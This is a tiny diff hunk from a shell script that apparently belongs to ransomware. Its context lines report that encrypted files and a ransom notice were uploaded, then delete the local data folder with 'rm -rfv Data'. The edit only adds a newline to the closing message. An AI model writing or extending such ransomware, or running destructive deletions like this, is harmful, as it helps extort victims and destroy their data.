@@ -85,6 +85,6 @@ printf "\n[*] Encrypted files and ransom notice successfully uploaded!\n"
 printf "\n[+] Deleting locally store data\n"
 cd ..
 rm -rfv Data
-printf "\n[V] All done!"
+printf "\n[V] All done!\n"
 
 
